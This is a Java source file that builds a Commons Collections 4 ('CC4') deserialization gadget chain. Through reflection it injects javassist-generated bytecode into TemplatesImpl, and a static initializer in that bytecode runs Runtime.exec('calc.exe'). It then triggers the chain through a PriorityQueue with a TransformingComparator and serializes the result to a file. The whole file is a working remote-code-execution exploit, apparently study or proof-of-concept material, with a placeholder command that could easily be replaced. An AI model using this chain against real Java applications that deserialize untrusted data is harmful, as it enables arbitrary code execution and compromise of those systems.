import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Main {
    public static void main(String[] args) throws Exception {
        final byte[] byteCode = makeByteCode();
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = TemplatesImpl.class;
        Field _nameField = clz.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates,"achilles");
        Field _bytecodesField = clz.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates,new byte[][]{byteCode});
        Field _tfactoryField = clz.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates,new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});


        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue,2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue,new Object[]{TrAXFilter.class,"bar"});
//        FileStream.writeSer(priorityQueue,"CC4.ser");
        FileStream.readSer("CC4.ser");

    }
    public static byte[] makeByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        return ctClass.toBytecode();
    }
}
